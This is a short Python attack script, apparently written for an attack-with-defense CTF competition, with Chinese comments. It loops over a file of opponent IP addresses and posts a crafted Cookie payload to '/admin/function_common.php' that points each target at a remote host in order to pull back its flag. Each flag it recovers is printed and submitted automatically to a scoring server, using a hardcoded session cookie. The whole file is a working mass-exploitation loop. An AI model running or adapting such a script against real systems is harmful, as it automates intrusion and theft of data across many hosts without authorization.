import requests
import string

def submitflag(flag) : 
    #填提交flag的地址
    url  = "http://127.0.0.1:8088/compete_record/"
    #对应的参数形式
    data = { "compete_answer" : { "flag" : flag }  }
    #headr中亮神记得根据抓包写一下Cookies,多个Cookie以分好';'分隔,
    headers = {
        "Cookies":"sessionid=fqopuoyttrfbx6ondrefdgpfkdmifgj2;cookie2=123;"
        }
    #当时我们交flag是用json交的 , get和post那种正常数据就不写了你酌情改
    r = requests.post(url , json=data , headers = headers)
    
url = "http://"
port = "80"
#读取ip列表
file1 = open("/Users/h3zh1/Desktop/CTF-AWD/省赛awd/last_ip.txt","r")
#rows存放所有的地方ip列表
rows = file1.readlines()
header = { "Cookie":"id_n=http://10.1.8.26/remoteflag;" }

#调用循环打请求
for i in rows:
    #前缀 http://ip:port 
    prefix = url + str( i.replace("\n","") ) #不用去掉
    
    target = prefix + "/admin/function_common.php"
    try:
        r = requests.post( target , headers = header , timeout = 0.5 )
        #print(r.headers)
        #根据你想要的判断条件改一下就可
        if ( r.status_code == 200 and len( r.text ) > 5 ) :
            print("[{0}]的flag==> {1}".format( target,r.text) )
            submitflag(r.text)
        r.encoding = "utf-8"
        #print(r.text)
    except:
        pass
        
file1.close()